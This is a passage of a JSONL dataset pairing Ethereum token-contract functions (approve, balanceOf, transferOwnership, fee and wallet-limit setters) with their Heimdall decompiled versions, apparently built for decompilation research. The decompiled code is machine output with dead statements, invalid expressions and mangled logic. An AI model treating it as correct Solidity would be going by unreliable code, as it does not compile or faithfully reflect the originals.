overflow\");\n        require(!(address(arg0) == (address(store_d / 0x01))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(!bytes1(store_d / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_d / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_d / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_d / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(0 > 0), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_e[var_a] > (storage_map_e[var_a] + 0)), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_j = 0x11;\n        require(!((storage_map_e[var_a] + 0) < storage_map_e[var_a]), \"SafeMath: addition overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x1b;\n        var_g = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_e[var_a] = storage_map_e[var_a] + 0;\n        uint256 var_c = 0;\n        emit Transfer(address(msg.sender), address(this), 0);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        uint256 var_e = 0x40 + var_e;\n        var_c = 0x1e;\n        var_k = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_e[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_l = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        uint256 var_h = var_e.length;\n        uint256 var_m = 0;\n        var_i = var_n;\n        var_m = 0;\n        require(!((storage_map_e[var_a] - arg1) > storage_map_e[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_j = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_e[var_a] = storage_map_e[var_a] - arg1;\n        var_e = 0x40 + var_e;\n        var_l = 0x1e;\n        var_o = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(0 > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_p = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_i = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        uint256 var_q = var_e.length;\n        uint256 var_r = 0;\n        var_s = var_n;\n        var_r = 0;\n        require(!(arg1 - 0) > arg1);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_j = 0x11;\n        require(arg1 < _taxSwapThreshold);\n        store_d = (0x01 * 0x01000000000000000000000000000000000000000000) | (uint248(store_d));\n        require(!0x02 > 0xffffffffffffffff);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_j = 0x41;\n        var_c = 0x02;\n        var_e = var_e + 0x60;\n        require(!0x02);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_j = 0x32;\n        address var_k = address(this);\n        var_o = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_c / 0x01).WETH(var_h); // staticcall\n        var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!((var_e + ret0.length) - var_e) < 0x20);\n        require(var_t == (address(var_t)));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_j = 0x32;\n        address var_l = address(var_t);\n        require(address(this) - 0);\n        require(address(store_c / 0x01) - 0);\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_c / 0x01);\n        address var_b = keccak256(var_a);\n        storage_map_e[var_a] = arg1;\n        uint256 var_p = arg1;\n        emit Approval(address(this), address(store_c / 0x01), arg1);\n        var_p = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        var_i = arg1;\n        var_q = 0;\n        uint256 var_s = ((0x04 + var_e) + 0xa0) - (0x04 + var_e);\n        uint256 var_u = var_e.length;\n        address var_v = address(transferDelayEnabled / 0x0100);\n        uint256 var_w = block.timestamp;\n        require(address(store_c / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(store_c / 0x01).Unresolved_791ac947(var_i); // call\n        var_p = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_i = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_q = 0x22;\n        var_s = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_v = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_i = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_q = 0x24;\n        var_s = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_v = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        store_d = (0x01 * 0x01000000000000000000000000000000000000000000) | (uint248(store_d));\n        require(!0x02 > 0xffffffffffffffff);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_j = 0x41;\n        var_c = 0x02;\n        var_e = var_e + 0x60;\n        require(!0x02);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_j = 0x32;\n        var_k = address(this);\n        var_o = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_c / 0x01).WETH(var_h); // staticcall\n        var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!(((var_e + ret0.length) - var_e) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_t == (address(var_t)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_j = 0x32;\n        var_l = address(var_t);\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_c / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_p = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_i = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_q = 0x22;\n        var_s = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_v = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_i = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_q = 0x24;\n        var_s = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_v = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (!storage_map_e[var_a] > _taxSwapThreshold) {\n        }\n        if (!store_d / 0x0100000000000000000000000000000000000000000000) {\n        }\n        require(arg1 - 0, \"SafeMath: multiplication overflow\");\n        require(!arg1 | (store_g == ((arg1 * store_g) / arg1)), \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_j = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((arg1 * store_g) / arg1) == store_g, \"SafeMath: multiplication overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x21;\n        var_g = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_h = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x40 + var_e;\n        var_c = 0x1a;\n        var_k = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        if (0x64 > 0) {\n            if (0x64) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_j = 0x12;\n                var_a = address(this);\n                var_b = 0x01;\n                if (store_d / 0x01000000000000000000000000000000000000000000) {\n                }\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_j = 0x12;\n                if (address(msg.sender) == (address(this))) {\n                }\n                if (arg1 - 0) {\n                }\n                require(0x64 > 0, \"Transfer amount must be greater than zero\");\n                require(0x64, \"Transfer amount must be greater than zero\");\n            }\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x29;\n        var_g = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_h = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xF36754d67a8C99e1D683915ED5A6E55aB259ba79", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0) - 0, \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(address(owner / 0x01), address(arg0));\n        owner = (address(arg0) * 0x01) | (uint96(owner));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x26;\n        var_e = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_f = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xa5f88146Cff0673fCea44A32ddB845302c835619", "original_solidity_code": "function updateBuy(\r\n        uint256 _devFee,\r\n        uint256 _liquidityFee,\r\n        uint256 _marketingFee\r\n    ) external onlyOwner {\r\n        buyDevFee = _devFee;\r\n        buyLiquidityFee = _liquidityFee;\r\n        buyMarketingFee = _marketingFee;\r\n        buyTotalFees = buyDevFee + buyLiquidityFee + buyMarketingFee;\r\n        require(buyTotalFees <= 100);\r\n    }", "heimdall_decompiled_code": "function updateBuy(uint256 arg0, uint256 arg1, uint256 arg2) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_s = arg0;\n        store_t = arg1;\n        store_u = arg2;\n        require(!arg0 > (arg1 + arg0));\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n    }"}
{"contract_address": "0xC1687b1453E40Bd9F46b33dFf3c6ea3A0Ea168eA", "original_solidity_code": "function approve(\r\n        address spender,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xF36754d67a8C99e1D683915ED5A6E55aB259ba79", "original_solidity_code": "function set_Max_Transaction_Percent(uint256 maxTxPercent_x10000) external onlyOwner() {\r\n        _maxTxAmount = _tTotal*maxTxPercent_x10000/10000;\r\n    }", "heimdall_decompiled_code": "function set_Max_Transaction_Percent(uint256 arg0) public {\n        require(arg0 == arg0);\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!totalSupply | (arg0 == ((totalSupply * arg0) / totalSupply)));\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(0x2710);\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x12;\n        _maxTxAmount = (totalSupply * arg0) / 0x2710;\n    }"}
{"contract_address": "0x2712ac3E4Fb06A0d1FB54E31eB81e7db4731c417", "original_solidity_code": "function setMaxWalletAmount(uint256 maxWalletAmount) external {\r\n        require(_msgSender() == shiaburnWallet);\r\n        require(maxWalletAmount > _tTotal.div(200), \"Amount must be greater than 0.5% of supply\");\r\n        _maxWalletAmount = maxWalletAmount;\r\n    }", "heimdall_decompiled_code": "function setMaxWalletAmount(uint256 arg0) public {\n        require(address(msg.sender) == (address(store_g)));\n        uint256 var_a = 0x40 + var_a;\n        var_b = 0x1a;\n        var_c = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0xc8, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        uint256 var_f = var_a.length;\n        require(!(0 > var_a.length), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_g = 0;\n        var_h = var_i;\n        require(!(0x20 > var_a.length), \"SafeMath: division by zero\");\n        var_g = 0;\n        require(0xc8, \"Amount must be greater than 0.5% of supply\");\n        var_j = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_k = 0x12;\n        require(arg0 > (totalSupply / 0xc8), \"Amount must be greater than 0.5% of supply\");\n        _maxWalletAmount = arg0;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x2a;\n        var_h = 0x416d6f756e74206d7573742062652067726561746572207468616e20302e3525;\n        var_l = 0x206f6620737570706c7900000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x92E27aedE3847Bbd0E4b917Ec2Ae444d4C3A622D", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x649695aB734cF73FDD08262D5297F0f34368274C", "original_solidity_code": "function updateController(address _newController) external {\r\n        if (_msgSender() == dev) {\r\n            _controller = Controller(_newController);\r\n        }\r\n    }", "heimdall_decompiled_code": "function updateController(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender) - (address(decimals / 0x0100)));\n        store_f = (address(arg0) * 0x01) | (uint96(store_f));\n    }"}
{"contract_address": "0x433261F4DCdF51419232FFe4eD44BA793AA2B9f7", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x3e628c6678825195453B33f713147B8fb641248b", "original_solidity_code": "function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_w) {\n            if (store_w - ((store_w >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_w >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_w >> 0x01;\n                if (store_w) {\n                    if (store_w - ((store_w >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_w >> 0x01) {\n                            if (0x1f < (store_w >> 0x01)) {\n                                var_a = 0x03;\n                                var_e = storage_map_c[var_a];\n                                if ((0x20 + var_c) + (store_w >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xEBe0De4bfB351537dd8Abdb2e53a880Cc13ce676", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_c[var_a];\n        return storage_map_c[var_a];\n    }"}
{"contract_address": "0x4cA919d9EBE767dC6429f911651321feA44cbe94", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0xaEAD18A6f788fb7460aDA9fDFf4C4Cd6Ba72dDBE", "original_solidity_code": "function explicitOwnershipOf(uint256 tokenId) external view returns (TokenOwnership memory);\\n\\n    /**\\n     * @dev Returns an array of `TokenOwnership` structs at `tokenIds` in order.\\n     * See {ERC721AQueryable-explicitOwnershipOf}", "heimdall_decompiled_code": "function explicitOwnershipOf(uint256 arg0) public view returns (bool) {\n        uint256 var_a = var_a + 0x80;\n        uint256 var_b = 0;\n        uint256 var_c = 0;\n        uint256 var_d = 0;\n        uint256 var_e = 0;\n        require(arg0 < 0x01);\n        require(!arg0 < totalSupply);\n        uint256 var_f = arg0;\n        var_g = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n        require(storage_map_s[var_f]);\n        var_a = var_a + 0x80;\n        uint256 var_h = 0;\n        uint256 var_i = 0;\n        uint256 var_j = 0;\n        uint256 var_k = 0;\n        var_f = arg0;\n        var_g = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n        var_a = var_a + 0x80;\n        uint256 var_l = 0;\n        uint256 var_m = 0;\n        uint256 var_n = 0;\n        uint256 var_o = 0;\n        var_l = address(storage_map_s[var_f]);\n        var_m = uint64(storage_map_s[var_f] >> 0xa0);\n        var_n = !(!bytes1(storage_map_s[var_f]));\n        var_o = storage_map_s[var_f] >> 0xe8;\n        uint256 var_p = address(var_a.length);\n        uint64 var_q = uint64(var_r);\n        var_s = !(!var_t);\n        uint24 var_u = uint24(var_v);\n        return abi.encodePacked(address(var_a.length), uint64(var_w), !(!var_x), uint24(var_y));\n        var_f = arg0 + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        var_g = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n        require(storage_map_s[var_f]);\n        var_a = var_a + 0x80;\n        var_h = 0;\n        var_i = 0;\n        var_j = 0;\n        var_k = 0;\n        var_f = arg0 + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        var_g = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n        var_a = var_a + 0x80;\n        var_l = 0;\n        var_m = 0;\n        var_n = 0;\n        var_o = 0;\n        var_l = address(storage_map_s[var_f]);\n        var_m = uint64(storage_map_s[var_f] >> 0xa0);\n        var_n = !(!bytes1(storage_map_s[var_f]));\n        var_o = storage_map_s[var_f] >> 0xe8;\n        var_p = address(var_a.length);\n        var_q = uint64(var_r);\n        var_s = !(!var_t);\n        var_u = uint24(var_v);\n        return abi.encodePacked(address(var_a.length), uint64(var_w), !(!var_x), uint24(var_y));\n        var_f = (arg0 + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        var_g = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n        require(storage_map_s[var_f]);\n        var_a = var_a + 0x80;\n        var_h = 0;\n        var_i = 0;\n        var_j = 0;\n        var_k = 0;\n        var_f = (arg0 + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        var_g = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n        var_a = var_a + 0x80;\n        var_l = 0;\n        var_m = 0;\n        var_n = 0;\n        var_o = 0;\n        var_l = address(storage_map_s[var_f]);\n        var_m = uint64(storage_map_s[var_f] >> 0xa0);\n        var_n = !(!bytes1(storage_map_s[var_f]));\n        var_o = storage_map_s[var_f] >> 0xe8;\n        var_p = address(var_a.length);\n        var_q = uint64(var_r);\n        var_s = !(!var_t);\n        var_u = uint24(var_v);\n        return abi.encodePacked(address(var_a.length), uint64(var_w), !(!var_x), uint24(var_y));\n        var_f = ((arg0 + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        var_g = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n        require(storage_map_s[var_f]);\n        var_a = var_a + 0x80;\n        var_h = 0;\n        var_i = 0;\n        var_j = 0;\n        var_k = 0;\n        var_f = ((arg0 + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        var_g = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n        var_a = var_a + 0x80;\n        var_l = 0;\n        var_m = 0;\n        var_n = 0;\n        var_o = 0;\n        var_l = address(storage_map_s[var_f]);\n        var_m = uint64(storage_map_s[var_f] >> 0xa0);\n        var_n = !(!bytes1(storage_map_s[var_f]));\n        var_o = storage_map_s[var_f] >> 0xe8;\n        var_p = address(var_a.length);\n        var_q = uint64(var_r);\n        var_s = !(!var_t);\n        var_u = uint24(var_v);\n        return abi.encodePacked(address(var_a.length), uint64(var_w), !(!var_x), uint24(var_y));\n        var_h = address(var_a.length);\n        var_i = uint64(var_r);\n        var_j = !(!var_t);\n        var_k = uint24(var_v);\n        return abi.encodePacked(address(var_a.length), uint64(var_w), !(!var_x), uint24(var_y));\n        var_h = address(var_a.length);\n        var_i = uint64(var_r);\n        var_j = !(!var_t);\n        var_k = uint24(var_v);\n        return abi.encodePacked(address(var_a.length), uint64(var_w), !(!var_x), uint24(var_y));\n    }"}
{"contract_address": "0xaCb8531Fb60d23846f82b8911F28b44D83e2554d", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xC0BA94337896c443b7728Dce84B0A750e290fbFd", "original_solidity_code": "function showSupply() public view returns (uint256) {\r\n        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));\r\n    }", "heimdall_decompiled_code": "function showSupply() public view {\n        uint256 var_a = 0;\n        var_b = 0x06;\n        var_a = 0xdead;\n        var_b = 0x06;\n        uint256 var_c = 0x40 + var_c;\n        var_d = 0x1e;\n        var_e = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(storage_map_j[var_a] > totalSupply), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_g = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        uint256 var_h = var_c.length;\n        uint256 var_i = 0;\n        var_j = var_k;\n        var_i = 0;\n        if (!(totalSupply - storage_map_j[var_a]) > totalSupply) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_l = 0x11;\n        }\n    }"}
{"contract_address": "0xEBe0De4bfB351537dd8Abdb2e53a880Cc13ce676", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_c[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
